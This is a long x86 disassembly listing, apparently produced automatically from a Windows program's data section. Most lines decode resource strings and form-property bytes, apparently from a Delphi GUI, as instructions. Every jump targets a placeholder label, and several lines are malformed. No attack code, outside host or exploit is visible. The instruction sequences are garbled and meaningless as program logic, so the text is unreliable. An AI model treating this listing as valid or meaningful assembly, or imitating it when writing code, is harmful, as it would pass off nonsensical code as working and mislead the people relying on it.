arpl [ ebx + esi * 2 + 0x4d ] sp
inc ebp
jb r-xdata
add [ eax ] al
push eax
sub eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x2d
inc ebx
add [ ebp + 0x1c0043 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040009 ] al
add [ eax ] al
sbb [ esi + 0x41 ] 0x0
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
clc
nop
inc ecx
add [ esp + ecx * 4 + 0x41 ] dl
add [ esp + ecx * 4 + 0x41 ] bl
imul esp [ esp + esi * 2 + 0x68 ] 0x432d0c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2d ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x2d3c0043 ] dh
inc ebx
add [ eax + eax ] bl
outsb
je r-xdata
jb r-xdata
jb r-xdata
outsb
jae r-xdata
adc [ fs : ebx + 0x64 ] ah
jne r-xdata
popad
jae r-xdata
add [ eax + 0x2d ] bh
inc ebx
add [ esp + esi * 2 ] cl
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
add [ ecx + edx * 4 + 0x41 ] ah
add [ eax - 0x53ffbe6b ] ch
xchg ebp eax
inc ecx
add [ eax - 0x5fffbe6b ] dh
xchg ebp eax
inc ecx
add [ esp + esi * 2 - 0x6e03ffbd ] dh
inc ecx
add [ eax - 0x6e ] bh
inc ecx
add [ ecx ] al
add bh bh
push [ eax + 0xf004374 ]
push esp
dec eax
popad
jb r-xdata
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
hlt
js r-xdata
push esp
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4065646f
sub al [ ebx ]
sbb eax 0xbcff0000
jae r-xdata
jb r-xdata
add [ eax ] ch
jae r-xdata
jae r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
outsb
je r-xdata
jb r-xdata
jae r-xdata
or al 0x74
sub eax 0xf070043
push esp
dec eax
popad
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5705000a ] al
or [ eax ] al
add eax 0x6c797453
lodsb [ gs : esi ]
adc [ eax ] al
or al 0x0
add bh bh
int3
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
adc edx [ eax + ecx * 2 + 0x65 ]
popad
outsd
je r-xdata
insb
jae r-xdata
outsd
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
popad
arpl [ ebx + 0x42 ] bp
imul ebp [ gs : bp + 0xb ] 0x72547374
popad
push esp
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
adc [ eax + 0x38 ] ch
sub [ ebx ] eax
retn
shl [ ecx + ebp + 0x2030043 ] 0x2e
cmp [ ecx ] eax
inc ebp
jns r-xdata
inc ebp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
pop esp
inc ebx
add [ eax ] cl
sbb [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
outsd
outsb
je r-xdata
popad
or dh [ ebx + esi * 2 + 0x54 ]
jb r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
arpl [ ebx + 0x4d ] bp
outsd
jbe r-xdata
insd
inc ebx
je r-xdata
sub eax 0x5f2c0043
inc ecx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
je r-xdata
outsb
je r-xdata
inc ebx
add [ ebx + ebp ] dl
jbe r-xdata
jbe r-xdata
outsb
jb r-xdata
insd
dec eax
popad
arpl [ ebx + 0x45 ] bp
outsb
dec esi
outsd
je r-xdata
outsd
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
outsd
insb
or [ edi ] al
je r-xdata
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
jb r-xdata
arpl [ ebx + 0x45 ] bp
outsb
or [ fs : ebx + 0x6f ] al
insd
inc ebx
je r-xdata
inc ebp
jbe r-xdata
insb
jae r-xdata
je r-xdata
je r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
imul edx [ ebx + 0x74 ] 0x61
outsd
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
add cl [ eax ]
or eax 0x64616548
sbb [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
outsd
outsb
je r-xdata
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
jae r-xdata
pop es
insb
jae r-xdata
outsb
je r-xdata
add [ ebx + 0x432d7cc0 ] cl
add [ ebx ] al
adc dl [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
jne r-xdata
outsd
dec eax
popad
jb r-xdata
add [ eax ] dl
xor al [ ebx ]
adc al 0x2b
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + 0x2d ] bh
inc ebx
add [ ebx + 0x432f5cc0 ] cl
add [ eax ] cl
adc [ ebx + edx * 2 + 0x65 ] edx
arpl [ ecx + ebp * 2 + 0x6f ] si
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x63617254
popad
jb r-xdata
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
add [ ebx + 0x432ec4c0 ] cl
add [ eax ] cl
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
xor al [ ebx ]
adc al 0x2b
jb r-xdata
jb r-xdata
rcl al 0x2d
inc ebx
add [ eax ] cl
pop ss
push esp
inc ebx
jne r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
jae r-xdata
je r-xdata
or [ esi ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
add [ ecx + edx ] ch
inc eax
add [ ebx + ebp ] dl
inc ebx
inc ebp
jbe r-xdata
outsb
push cs
push esp
push esp
outsd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
arpl [ ebx + 0x53 ] bp
outsb
inc esp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
outsd
outsb
je r-xdata
je r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
adc al 0x2b
je r-xdata
jae r-xdata
outsd
popad
jb r-xdata
je r-xdata
insd
dec eax
popad
jb r-xdata
inc eax
add ah dl
xor [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x32
jb r-xdata
add [ ebx + edx * 2 ] ecx
push esp
inc ebx
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
inc ebx
add [ eax ] cl
and [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ ebx + ebp ] dl
inc ebx
add [ eax ] al
adc [ eax ] al
nop
loopne r-xdata
outsb
je r-xdata
jb r-xdata
je r-xdata
outsb
jb r-xdata
insd
dec eax
popad
jb r-xdata
inc ebx
inc ebx
add [ ebx + ebp ] dl
insd
inc esp
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] eax
outsd
outsb
je r-xdata
rcl [ edi + 0x11380044 ] 0x1
add [ eax ] al
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax ] dh
jne r-xdata
push eax
adc [ edx ] eax
cmp [ esi ] cl
xor [ ebx ] eax
js r-xdata
add [ eax ] al
test al 0x31
inc ebx
add al bh
adc edx [ eax + ecx * 2 + 0x65 ]
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
or al 0x53
pop es
inc edx
outsd
outsd
insb
popad
outsb
jns r-xdata
outsd
insd
dec eax
add al 0x8
push es
push ebx
insd
dec eax
or [ ebx ] cl
inc esi
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xb ] si
outsd
outsb
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
xor al [ ebx ]
ja r-xdata
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
inc esp
add [ eax ] bh
outsb
jae r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7ffbccf ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi ] dl
outsd
insb
inc esp
add [ ecx + eax * 4 + 0x43 ] dl
add [ eax - 0x7 ] dh
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ eax + 0x76 ] bl
inc ebx
add [ edi + ecx + 0x77840045 ] ah
inc ebx
add [ eax + 0x44 ] cl
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
xor [ eax ] eax
sub [ ecx ] dh
inc eax
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + esi + 0x43 ] cl
add [ ecx ] cl
push 0x74754273
add [ gs : eax ] eax
dec eax
popad
popad
je r-xdata
imul ebp [ edi + 0x6e ] 0x73616c43
jae r-xdata
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
push cs
push esp
dec eax
popad
jb r-xdata
outsd
insb
push eax
jb r-xdata
arpl [ eax + eax + 0x7 ] si
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or [ ebx + 0x6f ] al
push 0x616c4673
je r-xdata
inc ebx
add [ esi + edi * 2 + 0x43 ] dl
add al bh
add [ ebx ] sub_438258
add al 0x84
inc ebx
add [ eax - 0x2bffbc86 ] bl
jpe r-xdata
add [ eax ] dh
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ eax ] al
xchg [ ebx ] eax
cmp [ edi - 0x7b93ffbd ] al
inc ebx
add [ 0x2bb03c00 ] cl
mov esp 0x201bc4e
add eax 0xb3004700
push [ edx - 0x4f004e01 ]
[ edi - 0x49005101 ]
inc edx
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
mov eax 0x94004033
sbb [ ebp ] eax
or al 0x31
add [ eax ] dl
xor al [ ebx ]
add [ eax ] al
add [ eax ] al
push eax
xor [ ebx ] al
add ecx [ esp + edx * 2 ]
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc ebp
add [ ecx + ecx * 2 ] dh
inc eax
add [ eax ] ch
xor [ eax ] eax
add [ esi + 0x43 ] dh
add al [ eax ]
add al dl
xchg edi eax
inc esp
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
je r-xdata
jb r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
jbe r-xdata
inc ebx
inc ebx
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or [ ecx ] cl
push cs
insb
lea eax [ eax ]
aam 0x30
inc ebx
insd
inc ebx
je r-xdata
inc ebx
outsd
je r-xdata
add [ eax ] cl
test [ ebx ] eax
loopne r-xdata
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x38 ] 0x84
dec ecx
insb
je r-xdata
inc ebp
add [ eax ] al
dec esp
xor [ ebx ] al
or [ eax + 0x73 ] ebp
inc edx
jne r-xdata
outsb
je r-xdata
add [ eax ] cl
inc edx
outsd
insb
aam 0x30
inc ebx
add [ ebx + ebx * 4 + 0x220044 ] al
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
in al dx
ja r-xdata
movsb [ edi ] [ esi ]
cmovne eax [ eax ]
test [ edi + 0x43 ] dh
inc ebx
add ah dh
jpe r-xdata
inc ebx
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
outsd
test [ ebx ] al
adc dh bh
inc esp
add [ esp + edx * 8 ] bl
inc esp
je r-xdata
aas
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
and al [ eax ]
add [ ebx + edi * 2 ] dl
inc ebx
add ah ch
js r-xdata
add [ eax ] al
add [ ecx ] dl
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add al 0x88
inc esp
add [ ecx ] ah
add bh bh
add al dl
add [ eax + eax + 0x5b ] 0x0
add bh bh
dec eax

jb r-xdata
add [ esp + edx * 2 ] dl
inc ebx
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x48080014 ] al
outsd
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ edx ] ah
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jpe r-xdata
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
dec eax
insb
add [ eax ] eax
jae r-xdata
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060017 ] al
insd
popad
jb r-xdata
add bh bh
jpe r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7c65646f
xchg esi eax
inc esp
add [ ecx + eax ] ch
add dh bh
add [ eax ] al
insd
dec eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
mov [ eax + eax + 0x74 ] al
add [ eax ] al
dec [ eax ]
sti
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0018 ] al
outsd
outsb
jae r-xdata
jae r-xdata
arpl [ ebx ] bp
adc [ eax ] al
push eax
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
str [ edx ]
inc esp
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
outsd
outsb
je r-xdata
jb r-xdata
movsd [ edi ] [ esi ]
inc ebp
insb
popad
jb r-xdata
add [ eax ] al
inc ebx
jne r-xdata
push esp
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
push 0x4873726f
outsd
insb
lea eax [ eax ]
adc al 0x32
inc ebx
add [ edi ] al
adc al 0x54
inc ebx
jne r-xdata
outsd
outsb
je r-xdata
inc esi
add [ bx + si ] dl
inc eax
add [ ecx ] ah
add al [ eax ]
call [ ebx + edi * 2 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
int3
adc al 0x4f
outsb
inc ebx
jb r-xdata
imul ebp [ esi + 0x74 ] 0x432d4c73
add [ eax ] cl
add al [ eax ]
call [ eax + 0x100437b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
popad
bound ebp [ ebp + 0x64 ]
movsb [ edi ] [ esi ]
and al 0x42
add [ eax ] ch
add bh bh
sub bh dl
inc esp
add [ eax ] bh
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsb
jb r-xdata
add [ eax ] ah
add al [ eax ]
inc [ eax + 0x7b ]
inc ebx
jae r-xdata
pop eax
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0021 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
nop
push ebp
inc ecx
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
add al [ eax ]
jmp [ eax + 0x2 ]
popad
je r-xdata
jae r-xdata
xor [ ebx ] al
sub al 0x2
add bh bh
push 0x100437b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5305001a ] al
je r-xdata
adc [ eax ] al
and [ edx ] al
add bh bh
inc eax
jpo r-xdata
add [ eax ] ch
add al [ eax ]
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
insb
inc esp
inc eax
jb r-xdata
insd
dec eax
popad
jb r-xdata
push eax
jb r-xdata
arpl [ ebx - 0x75 ] bp
rcr [ eax + 0x8004335 ] 0x11
push esp
inc esp
jb r-xdata
push ebx
pop eax
inc ebx
add [ eax + 0x2 ] dl
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
outsb
inc esp
jb r-xdata
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001e ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
je r-xdata
insb
fsubr [ gs : edi ]
inc ebx
add [ eax + 0x2 ] dh
add bh bh
jo r-xdata
add [ fs : eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46080013 ] al
jne r-xdata
add [ eax ] al
adc al [ eax ]
or eax [ edx + esi * 2 + 0x61 ]
push edx
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
xchg [ eax + eax - 0x65 ] eax
mov cl cl
inc esp
add [ edx + ecx * 8 ] ah
inc esp
outsd
outsb
popad
jb r-xdata
jae r-xdata
outsb
add [ eax + edi ] ch
inc ebx
add [ ebx + ebp ] dl
inc ebx
ja r-xdata
adc [ eax ] al
lea eax [ eax ]
sbb [ esi ] dh
inc ebx
add [ eax ] cl
adc edx [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esi
outsd
je r-xdata
outsb
je r-xdata
je r-xdata
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push edx
jae r-xdata
outsd
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
pushad
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
add bh bh
push esp
dec eax
popad
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax + edi ] ch
inc ebx
add [ ebx + ebp ] dl
inc ebx
add [ ebx + 0x433674c0 ] cl
pop es
jb r-xdata
jns r-xdata
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
jb r-xdata
outsd
outsb
push cs
push esp
dec eax
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
shr [ esi ] 0x43
add [ eax + 0x2 ] bl
add bh bh
pop eax
add al [ eax ]
cmp [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
arpl [ ebx + 0x53 ] bp
arpl [ ebx + 0x45 ] bp
jbe r-xdata
adc dl [ ebx + edx * 2 + 0x65 ]
outsd
outsb
je r-xdata
mov eax eax
je r-xdata
jbe r-xdata
inc edx
outsd
outsd
insb
popad
outsd
outsb
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
insb
push cs
push esp
dec eax
popad
jb r-xdata
or eax 0x64616548
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
inc esp
add [ ecx + eax * 4 + 0x43 ] dl
add [ eax - 0x7 ] dh
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ eax + 0x76 ] bl
inc ebx
add [ edi + ecx + 0x77840045 ] ah
inc ebx
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
in al dx
ja r-xdata
add [ eax + 0x44 ] cl
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
inc ebp
add [ ecx + edx + 0x45 ] bl
xor al 0x49
je r-xdata
cmp [ ebx ] al
adc al 0x2b
outsb
je r-xdata
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] dh
outsd
insb
push cs
push esp
dec eax
popad
jb r-xdata
outsb
push cs
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add [ eax ] cl
adc dl [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
inc ebx
jb r-xdata
outsb
je r-xdata
outsd
insb
push cs
push esp
dec eax
popad
jb r-xdata
or [ 0x64616548 ] cl
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x63617254
imul eax [ ebp + 0x76 ] 0x65
outsd
outsb
je r-xdata
outsd
insb
dec eax
aaa
inc ebx
add [ eax ] dl
xor al [ ebx ]
xor eax [ eax ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ eax ] dh
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ eax ] al
xchg [ ebx ] eax
cmp [ edi - 0x7b93ffbd ] al
inc ebx
add [ esi ] cl
push esp
dec eax
popad
jb r-xdata
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x38 ] 0x84
inc ebx
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax ] dh
jne r-xdata
inc ebp
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + 0x2d ] bh
inc ebx
add [ ebx + 0x433748c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi ] ch
inc ebx
add [ ebx + ebp ] dl
add al 0x8
or eax 0x64616548
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc ebp
add [ ecx + ecx * 2 ] dh
je r-xdata
outsd
outsb
je r-xdata
add cl [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x69570500
je r-xdata
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6548540e
popad
outsd
aas
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
jae r-xdata
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add al 0x88
inc esp
add [ ecx ] ah
add bh bh
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
sbb al 0x38
inc ebx
add [ eax + 0x2 ] bh
add [ eax ] al
mov [ eax ] dh
inc ebx
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
outsd
insb
outsd
insb
or [ edi ] al
push ebx
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
pop es
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ ecx ] dl
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
dec [ eax + 0x240044c9 ]
0x44
add al dl
add [ eax + eax + 0x5b ] 0x0
add bh bh
dec eax

add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
dec eax
push esp
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
pop edi
add [ eax ] al
push [ eax ]
outsd
insb
nop
xor [ eax ] bh
inc ebx
add [ edi ] al
push cs
push esp
dec eax
popad
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
add [ esi + 0x43 ] dh
or al [ edx ]
mov eax 0x94004033
sbb [ ebp ] eax
or al 0x31
jb r-xdata
add [ eax ] al
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ edx ] ah
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jpe r-xdata
add dh bh
pop eax
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
mov cl cl
inc esp
add [ edx + ecx * 8 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
outsb
je r-xdata
adc [ eax ] al
and [ edx ] al
add bh bh
inc eax
jpo r-xdata
add bh bh
jpe r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7c65646f
xchg esi eax
inc esp
add [ ecx + eax ] ch
add [ eax ] cl
inc edx
rol [ eax ] 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ esi ] al
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
